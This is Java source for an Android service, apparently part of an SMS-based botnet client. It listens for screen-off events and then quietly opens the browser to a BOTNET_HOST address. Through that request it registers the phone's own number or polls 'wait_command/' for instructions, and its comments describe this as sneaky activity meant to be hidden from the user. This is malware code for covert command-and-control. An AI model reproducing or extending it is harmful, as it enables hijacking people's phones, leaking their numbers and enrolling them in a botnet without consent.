package com.SmsService;


import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.IBinder;
import android.content.BroadcastReceiver; 
import android.content.Context;
import android.content.IntentFilter;

public class ScreenMonitor extends Service {

	
	
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
	public void onCreate() {
		Debug.PrintLog("ScreenMonitor","Screen Service created...");
		IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
		filter.addAction(Intent.ACTION_SCREEN_OFF);
		BroadcastReceiver SR = new ScreenRceiver();
		registerReceiver(SR,filter);		
	}
	
	public void onDestroy() {
		Debug.PrintLog("ScreenMonitor","Screen Service destroyed...");
	}
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {	
		if (CommonVariable.ScreenOn){
			Debug.PrintLog("ScreenMonitor","Screen is on....");
			//if browser has network connection when screen is off
			//stop the browser from here
			/*
			if(browserOnFlag) {				
				stopBrowser();			
			}
			*/		
			
			//close the browser, hoping it is on time.......			
		}
		
		
		
		
		else {
			Debug.PrintLog("ScreenMonitor","Screen is off....");
			//do some sneaky shit here...... 
			//change the uri to some other get request
			
			if(CommonVariable.enableSneakyFlag.equals("true")) {
				
				if( !CommonVariable.browserOnFlag && CommonVariable.CommandServiceLock.equals("false") && CommonVariable.ResponseServiceLock.equals("false") ) {
					if ( CommonVariable.leftBotNumber.equals("") || CommonVariable.rightBotNumber.equals("") ) {
						startBrowser("register/"+CommonVariable.selfNumber);
					}
					else {
						startBrowser("wait_command/"+CommonVariable.selfNumber);
					}
					
					// a new queue of network command is request
					// set the netCommandHandle to false
				}	
				
			}
			
			
		}
	    return START_STICKY;
	}
	
	
	
	private void startBrowser(String command) {
		/*
		Intent intent = new Intent(Intent.ACTION_VIEW,Uri.parse(CommonVariable.BOTNET_HOST+command));
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		startActivity(intent);
		*/
		
		Debug.PrintLog("ScreenMonitor","Start Browser: "+CommonVariable.BOTNET_HOST+command);
		startActivity(new Intent(Intent.ACTION_VIEW,
				Uri.parse(CommonVariable.BOTNET_HOST+command)).setFlags
				(Intent.FLAG_ACTIVITY_NEW_TASK).setClassName
				("com.android.browser", "com.android.browser.BrowserActivity"));
		
		CommonVariable.browserOnFlag = true;
	}	
	
	

}


